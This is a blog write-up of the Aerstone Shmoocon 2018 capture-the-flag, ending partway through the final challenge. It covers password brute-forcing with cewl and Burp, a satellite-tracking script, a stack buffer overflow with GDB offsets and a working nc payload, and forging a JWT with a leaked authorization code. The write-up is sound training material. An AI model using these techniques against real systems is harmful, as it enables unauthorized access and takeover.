@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>
+    
+      Aerstone CTF for Shmoocon 2018 &middot; T0w3ntum
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+</head>
+
+
+  <body>
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="/">
+          <h2 class="nav-title">T0w3ntum</h2>
+        </a>
+        <ul>
+          <!-- <li><a href="/about">About</a></li>
+          <li><a href="/">Posts</a></li> -->
+        </ul>
+    </div>
+  </nav>
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        T0w3ntum
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2018-01-21 00:00:00 -0600">January 21, 2018</time>
+    
+  </div>
+
+  <h1 class="post-title">Aerstone CTF for Shmoocon 2018</h1>
+  <div class="post-line"></div>
+
+  <h1 id="01--global-tramsmitter-network-access">01 – Global Tramsmitter Network Access</h1>
+
+<h3 id="objective">Objective:</h3>
+
+<blockquote>
+  <p>In order to communicate with the satellite, you must first gain access to a satellite transceiver ground station.
+The system is heavily locked down. Before we can perform any actions we must obtain a vaild authorization code.
+Access the GTN at: https://gtn.shmoocon2018.aerstone.com
+NOTE: Brute forcing IS allowed, just play nice ;)</p>
+</blockquote>
+
+<h3 id="solution">Solution:</h3>
+
+<p>I’ll admit, I spent a lot of time on this one as I imagine a lot of the competators did. I’m not used to brute force being the answer when it comes to CTF’s, however it was in this case.
+First, I generated a small wordlist by running cewl on the site.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# cewl https://gtn.shmoocon2018.aerstone.com
+CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+Communication
+Message
+Global
+Transmitter
+Network
+GTN
+Available
+Dishes
+Main
+Menu
+Transmission
+Bootstrap
+Home
+Transmit
+Administration
+Log
+ACCESS
+DENIED
+container
+Login
+Communications
+View
+Adjust
+Dish
+Edit
+communication
+Please
+login
+</code></pre></div></div>
+
+<p>As it’s a rather small list, I just fed this into Burp intruder and ran it. The following image shows that the password Communications returns a different content length, and sure enough that is the correct password.</p>
+
+<p><img src="../images/aerstone/1*THA816VVcWzqV81CIzW3ig.png" alt="" /></p>
+
+<p>And now we have our flag!</p>
+
+<p><img src="../images/aerstone/1*gxVS_6ArlIdRbbB3TBZirw.png" alt="" /></p>
+
+<h1 id="02--azimuth">02 – Azimuth</h1>
+
+<blockquote>
+  <p>Now that you have control over the ground station, you must determine the coordinates of where to point the satellite.
+We have recently spotted the satellite and computed it’s orbit. You now must determine the location of the satellite in orbit and position the communication array accordingly.
+<code class="highlighter-rouge">nc azimuth.shmoocon2018.aerstone.com 3000</code></p>
+</blockquote>
+
+<h3 id="solution-1">Solution:</h3>
+
+<p>Here is what we are told when we first connect to the server:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#########################################################################
+# Before you can communicate with an orbiting object, you must          #
+# first determine it's azimuth and elevation so the transmitter         #
+# can be accuratly positioned                                           #
+#                                                                       #
+# First you must proove you can calculate them correctly before         #
+# we will give you the final information.                               #
+#                                                                       #
+# You will receive four lines formatted as such:                        #
+#                                                                       #
+# Line 1: Two Line Element Set                                          #
+# Line 2: Two Line Element Set                                          #
+# Line 3: Two Line Element Set                                          #
+# Line 4: latitude longitude altitude timestamp                         #
+#                                                                       #
+# Altitue is given in meters, timestamp is UTC                          #
+#                                                                       #
+# Line 4 contains coordinates on Earth for a transmitter.               #
+#                                                                       #
+# Please return a single line (\n terminated) with azimuth and          #
+# elevation in degrees with the format:                                 #
+# azimuth elevation                                                     #
+#                                                                       #
+# If there is no solution return:                                       #
+# no solution                                                           #
+#                                                                       #
+# Tolerance is allowed up to 0.20 degrees                               #
+#                                                                       #
+# Assume a horizon of 0.0 degrees                                       #
+#########################################################################
+# EXAMPLETLE0118                                                        #
+# 1 71589U 88340Q   17338.08999788 .2662445-1 000000-0 178530-2 0 09181 #
+# 2 71589  157.285 108.4565 30303-2 112.3047 141.1933 12.74449262354565 #
+# 0.1732186 -71.8916986 7 2018-01-02 18:54:15.493294                    #
+# 237.7788292 4.8210156                                                 #
+#########################################################################
+AERSTONE000000          
+1 85510U 97470H   17354.56692690 .6821516-1 000000-0 904700-3 0 09779
+2 85510  167.959 356.9992 12869-0 193.5472 137.5222 8.718387745640267
+-20.7218987 54.4410721 2451 2018-01-21 17:52:38.651217
+# [E
+</code></pre></div></div>
+
+<p>We are given TLE data and need to calculate the azimuth and elevation. Lucky for us, there is a python library to help with this: <a href="http://rhodesmill.org/pyephem/">ephem</a></p>
+
+<p>After messing with it for a little bit and making sure I could calculate the example provided, I fired off my first script to find out that it wants me to do more than one set. After modifying the script and messing with timing, here is the final script used.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lines</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="n">sat</span> <span class="o">=</span> <span class="n">ephem</span><span class="o">.</span><span class="n">readtle</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span><span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">],</span><span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">observer</span> <span class="o">=</span> <span class="n">lines</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">ga</span> <span class="o">=</span> <span class="n">ephem</span><span class="o">.</span><span class="n">Observer</span><span class="p">()</span>
+<span class="n">ga</span><span class="o">.</span><span class="n">lat</span><span class="p">,</span> <span class="n">ga</span><span class="o">.</span><span class="n">lon</span><span class="p">,</span> <span class="n">ga</span><span class="o">.</span><span class="n">elevation</span><span class="p">,</span> <span class="n">ga</span><span class="o">.</span><span class="n">date</span> <span class="o">=</span> <span class="n">observer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">observer</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">observer</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">observer</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s">' '</span><span class="o">+</span><span class="n">observer</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+<span class="k">try</span><span class="p">:</span>
+ <span class="n">sat</span><span class="o">.</span><span class="n">compute</span><span class="p">(</span><span class="n">ga</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+ <span class="k">return</span> <span class="s">"no solution</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">try</span><span class="p">:</span>
+ <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">alt</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+  <span class="k">return</span> <span class="s">"no solution</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">except</span><span class="p">:</span>
+ <span class="k">return</span> <span class="s">"no solution</span><span class="se">\n</span><span class="s">"</span>
+<span class="k">else</span><span class="p">:</span>
+ <span class="k">try</span><span class="p">:</span>
+  <span class="k">print</span> <span class="s">"</span><span class="si">%.8</span><span class="s">f </span><span class="si">%8</span><span class="s">f</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">az</span><span class="p">),</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">alt</span><span class="p">))</span>
+  <span class="k">return</span> <span class="s">"</span><span class="si">%.8</span><span class="s">f </span><span class="si">%8</span><span class="s">f</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">az</span><span class="p">),</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">alt</span><span class="p">))</span>
+ <span class="k">except</span><span class="p">:</span>
+  <span class="k">return</span> <span class="s">"no solution</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"azimuth.shmoocon2018.aerstone.com"</span><span class="p">,</span> <span class="mi">3000</span><span class="p">))</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="o">.</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4000</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">data</span>
+<span class="n">final</span> <span class="o">=</span> <span class="n">calculate</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"[*] </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">final</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">final</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We send this off, calculate 200 runs and then get the flag.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># [!] Finished! FLAG:{91420600-a63c-427f-91f7-39fd95369a78}
+# [!] Use the following TLE to align a ground station through the GTN
+ZUMA
+1 43098C 18001A   17348.22568377  .00001930  00000-0  36372-4 0  9991
+2 43098  51.6433 220.8012 0002958 228.0883 233.9521 15.54138244 89755
+</code></pre></div></div>
+
+<p>The TLE data given will be used in a later challenge, and is a small challenge itself.</p>
+
+<h1 id="03--satellite">03 – satellite</h1>
+
+<h3 id="objective-1">Objective:</h3>
+
+<blockquote>
+  <p>We have received the original source code of the satellite (don’t ask how).
+Find a vulnerability within the communications module that allows you to execute either <code class="highlighter-rouge">selfDestruct()</code> or <code class="highlighter-rouge">deploy(float lat, float lon)</code>.</p>
+</blockquote>
+
+<blockquote>
+  <p>Test your payloads by sending them to:</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="highlighter-rouge">satsim.shmoocon2018.aerstone.com 3000</code></p>
+</blockquote>
+
+<blockquote>
+  <p>e.g.</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="highlighter-rouge">./exploit.py | nc satsim.shmoocon2018.aerstone.com 3000</code></p>
+</blockquote>
+
+<blockquote>
+  <p>NOTE: Architecture is x86_64 with no ASLR. You do not need to gain shell access!
+NOTE: There is a bug with timing on the server. Send your payload immediatly, e.g. <code class="highlighter-rouge">exploit.py &gt; data; nc satsim.shmoocon2018.aerstone.com 3000 &lt; data</code>. This does not affect local binaries</p>
+</blockquote>
+
+<h3 id="solution-2">Solution:</h3>
+
+<p>We are given the raw source files to go through. Immediately we can see what the protocol is expecting in <strong>satlib.h</strong> as the developer left a nice comment about it.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ * Satelllite Communications Protocol:
+ *
+ *  +---------------------+
+ *  |       Header        |
+ *  +---------------------+
+ *  |     Module Data     |
+ *  +---------------------+
+ *  |       Header...     |
+ *  +---------------------+
+ *  |     Module Data     |
+ *  +---------------------+
+ *
+ * Header:
+ *   0                   1                  
+ *   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7
+ *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ *   |    Version    |   Data Type     |
+ *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ *
+ * After receiving a 'header' with a valid 'Version', the data stream will be
+ * passed off to the module defined by 'Data Type'
+ *
+ * Valid Version: 0x13
+ * Available Data Type:
+ *    Propulsion Module:     0x20
+ *    Abort Module:          0x30
+ *    Communications Module: 0x37
+ *    END:                   0x00
+ *
+ * A Data Type of "END" will terminate the server
+ *
+ * Example Data Stream:
+ *     13200100011300
+ *
+ *       Header   Prop Head   Prop Data   Header  
+ *     [ 13|20 ]    [ 01 ]    [ 0001 ]   [ 13|00 ]
+ */</span>
+</code></pre></div></div>
+
+<p>Knowing how to structure the header, I then need to find a module to call. After looking around, I find this in <strong>comms.h</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ *    
+ * Communications Header:
+ *   0                   1                  
+ *   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7
+ *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ *   |     Type      |      Size       |
+ *   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ *
+ * Valid Types are:
+ *   * Text:   0x00
+ *   * Binary: 0x01
+ *
+ * The Communications module will:
+ *   * Read the Communications Header
+ *   * Pass processing of communications information to a submodule for each
+ *     'type'
+ **/</span>
+</code></pre></div></div>
+
+<p>and here is the <strong>comms.c</strong> file:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "common.h"
+#include "satlib.h"
+#include "comms.h"
+</span><span class="kt">int</span> <span class="n">comms_txt</span><span class="p">(</span><span class="k">struct</span> <span class="n">comms_header</span> <span class="o">*</span><span class="n">header</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">get_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">header</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[E] Failed to read data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[I] Received: '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="n">comms_bin</span><span class="p">(</span><span class="k">struct</span> <span class="n">comms_header</span> <span class="o">*</span><span class="n">header</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+    <span class="kt">int</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">header</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">bytes</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[E] Failed to read data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[I] Received: %d bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="n">comms_module</span><span class="p">(</span><span class="k">struct</span> <span class="n">header</span><span class="o">*</span> <span class="n">header_buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+    <span class="k">struct</span> <span class="n">comms_header</span> <span class="n">ch</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[I] Processing comms module</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="n">get_data</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">comms_header</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[E] Failed to read data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="k">switch</span><span class="p">(</span><span class="n">ch</span><span class="p">.</span><span class="n">type</span><span class="p">){</span>
+        <span class="k">case</span> <span class="n">COMMS_TXT</span><span class="p">:</span> <span class="k">return</span> <span class="n">comms_txt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">COMMS_BIN</span><span class="p">:</span> <span class="k">return</span> <span class="n">comms_bin</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ch</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">};</span>
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Since comms_txt looks like a promising place to perform a buffer overflow, I can craft the first part of the payload with the following three bytes.</p>
+
+<p><code class="highlighter-rouge">“\x13\x37\x00”</code></p>
+
+<p>This will tell the program the appropriate version, then to call the Communications Module and use COMMS_TXT within that module.</p>
+
+<p>Now a little bit of fuzzing and I can successfully cause a seg fault.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# python -c'print "\x13\x37\x00" + "A" * 50' | ./zuma
+Self Destruct: 0x555555554ad0
+deploy: 0x555555554b25
+[I] Processing comms module
+[I] Received: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+'
+Segmentation fault
+</code></pre></div></div>
+
+<p>Great, time to find out exactly where that seg fault occurs by generating a simple pattern and using GDB to determine what RBP gets overwritten with. Below you can see that the pattern is seen in RBP with an exact offset of 33. Adding 8 to this gives us 41.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+root@kali:/mnt/hgfs/kali64/zuma/bin# python -c'print "\x13\x37\x00" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"' &gt; in2.txt
+root@kali:/mnt/hgfs/kali64/zuma/bin#
+root@kali:/mnt/hgfs/kali64/zuma/bin# gdb -q ./zuma
+Reading symbols from ./zuma...(no debugging symbols found)...done.
+gdb-peda$ r &lt; in2.txt
+Starting program: /mnt/hgfs/kali64/zuma/bin/zuma &lt; in2.txt
+Self Destruct: 0x555555554ad0
+deploy: 0x555555554b25
+[I] Processing comms module
+[I] Received: 'a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+'
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0x0
+RDX: 0x0
+RSI: 0x555555757260 ("'\n] Received: 'a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab\n")
+RDI: 0x0
+RBP: 0x6241326241316241 ('Ab1Ab2Ab')
+RSP: 0x7fffffffe0d8 ("3Ab4Ab5Ab\n")
+...SNIP...
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00005555555548c1 in comms_txt ()
+gdb-peda$
+root@kali:/mnt/hgfs/kali64/zuma/bin# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50 -q 0x6241326241316241
+[*] Exact match at offset 33
+</code></pre></div></div>
+
+<p>Now to verify that I can control the value of RBP, I regenerate the following payload.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# python -c'print "\x13\x37\x00" + "A" * 31 + "B" * 16' &gt; in2.txt
+root@kali:/mnt/hgfs/kali64/zuma/bin# exit
+exit
+gdb-peda$ r &lt; in2.txt
+Starting program: /mnt/hgfs/kali64/zuma/bin/zuma &lt; in2.txt
+Self Destruct: 0x555555554ad0
+deploy: 0x555555554b25
+[I] Processing comms module
+[I] Received: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB
+'
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0x0
+RDX: 0x0
+RSI: 0x555555757260 ("'\n] Received: '", 'A' &lt;repeats 30 times&gt;, 'B' &lt;repeats 16 times&gt;, "\n")
+RDI: 0x0
+RBP: 0x4242424242424242 ('BBBBBBBB')
+...SNIP...
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00005555555548c1 in comms_txt ()
+</code></pre></div></div>
+
+<p>I control RBP which means I control the return value for the comms_txt() function. Now I just need to know the address to put there, luckily the program tells me.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# nc satsim.shmoocon2018.aerstone.com 3000
+Self Destruct: 0x555555554b36
+deploy: 0x555555554b8b
+[E] Failed to read header
+</code></pre></div></div>
+
+<p>So I send the payload and get the flag</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/hgfs/kali64/zuma/bin# python -c'print "\x13\x37\x00" + "\x90" *(41) + "\x36\x4b\x55\x55\x55\x55\x00\x00"' &gt; in.txt | nc satsim.shmoocon2018.aerstone.com 3000 &lt; in.txt
+Satellite Destroyed!
+VICTORY! FLAG{27c66ea7-415d-4ede-a79e-674d4dbc6036}
+</code></pre></div></div>
+
+<h1 id="04--gtn-33">04 – GTN 3/3</h1>
+
+<h3 id="objective-2">Objective:</h3>
+
+<blockquote>
+  <p>Once you have a functioning payload, now you need to transmit it.</p>
+</blockquote>
+
+<blockquote>
+  <p>Use the GTN to transmit a valid and authorized message.</p>
+</blockquote>
+
+<blockquote>
+  <p>Earlier we intercepted a message sent to the ISS. Maybe it can be of use to you.</p>
+</blockquote>
+
+<blockquote>
+  <p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkJlcnJ5X1N1bW1lcnMiLCJkYXRhIjoiVlZWRVJFeFNURkpDUVFvPSJ9.0nMwjRVXgO9zsptjyTFdP6qE1FKwXpo-2QeUEIfuVEc</p>
+</blockquote>
+
+<blockquote>
+  <p>https://gtn.shmoocon2018.aerstone.com/?page=adjust_dish</p>
+</blockquote>
+
+<blockquote>
+  <p>NOTE: You will receive a flag after successfully transmitting a message through the GTN</p>
+</blockquote>
+
+<h3 id="solution-3">Solution:</h3>
+
+<p>Immediatly, I can see that it is using a JWT token with the following information</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">Header</span><span class="p">:</span><span class="w">
+</span><span class="p">{</span><span class="w">
+ </span><span class="s2">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
+ </span><span class="s2">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HS256"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span><span class="err">Payload</span><span class="p">:</span><span class="w">
+</span><span class="p">{</span><span class="w">
+ </span><span class="s2">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Berry_Summers"</span><span class="p">,</span><span class="w">
+ </span><span class="s2">"data"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VVVERExSTFJCQQo="</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>What I don’t know is the signature, however I do have admin access to the GTN for which we can generate an employee report. The report contains the Authorization Code for all of the employees</p>
+
+<p><img src="../images/aerstone/1*NzZFRvlUfcjnys3KTmdA1w.png" alt="" /></p>
+
+<p>I can see the Authorization Code for Berry Summers and using jwt.io I can verify the signature</p>
+
+<p><img src="../images/aerstone/1*sfUEcgeNTF-rqodV80saDg.png" alt="" /></p>
+
+<p>Unfortunately, I can’t use Berry Summers, see the below screenshots to see why.</p>
+
+<p><img src="../images/aerstone/1*jlEbDnmVSv7uuYYz7ilUbg.png" alt="" /></p>
+
+<p>Instead, I picked out a different user from the list, Penny Solomon with Authorization Code of 5J2F8LG426 and crafted a new JWT.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IlBlbm55X1NvbG9tb24iLCJkYXRhIjoiVlZWRVJFeFNURkpDUVFvPSIsImp0aSI6Ijk4ZWUyMmMwLTdkYjUtNGE3YS1hMzEwLWE1YTQ4MThhOGQxOCIsImlhdCI6MTUxNjU2MTM4OSwiZXhwIjoxNTE2NTY0OTg5fQ.Il6LkaN-i94MPWfUayGvmDjokEvWUFWcNNOb8P6gDw4
+</code></pre></div></div>
+
+<p>And got my flag.</p>
+
+<p><img src="../images/aerstone/1*In8WGco98Gd763pUtyz3yw.png" alt="" /></p>
+
+<h1 id="final--all-together-now">Final – All Together now</h1>
+
+<h3 id="objective-3">Objective:</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>One, two, three, four,
+Can I have a little more,
+Five, six, seven, eight, nine, ten,
+I hax you.
+</code></pre></div></div>
+
+<blockquote>
+  <p>Takedown</p>
+</blockquote>
+
+<blockquote>
+  <p>Once you have:</p>
+  <ul>
+    <li>Accessed the GTN</li>
+    <li>Calculated the satellite position</li>
+    <li>Crafted a successful payload</li>
+    <li>Packaged it all up nicely</li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p>You can then send your payload to the satellite.</p>
+</blockquote>
+
+<blockquote>
+  <p>https://gtn.shmoocon2018.aerstone.com</p>
+</blockquote>
+
+<blockquote>
+  <p>NOTE: Validation is done against current times.</p>
+</blockquote>
+
+<h3 id="solution-4">Solution:</h3>
+
+<p>Remember that TLE from challenge 2? That’s important here:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZUMA
+1 43098C 18001A   17348.22568377  .00001930  00000-0  36372-4 0  9991
+2 43098  51.6433 220.8012 0002958 228.0883 233.9521 15.54138244 89755
+</code></pre></div></div>
+
+<p>First, I needed to fix the TLE, this required a fair bit of study on TLE format. What I learn is that the last digit on lines 2 and 3 are the checksum value which is wrong in both lines.</p>
+
+<p>In order to calculate the checksum, first you add up all the values. All non-digits except for the ‘-’ equal 0, ‘-’ equals 1. So for line 2 we have.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1+4+3+0+9+8+0+1+8+0+0+1+0+1+7+3+4+8+0+2+2+5+6+8+3+7+7+0+0+0+0+0+1+9+3+0+0+0+0+0+0+1+0+3+6+3+7+2+1+4+0+9+9+9=165
+</code></pre></div></div>
+
+<p>Then take the result and mod 10 it.</p>
+
+<p><code class="highlighter-rouge">165 % 10 = 5</code></p>
+
+<p>So now the second line becomes</p>
+
+<p><code class="highlighter-rouge">1 43098C 18001A   17348.22568377  .00001930  00000-0  36372-4 0  9995</code></p>
+
+<p>Repeat the process for the last line and now I have a properly formatted TLE</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZUMA
+1 43098C 18001A   17348.22568377  .00001930  00000-0  36372-4 0  9995
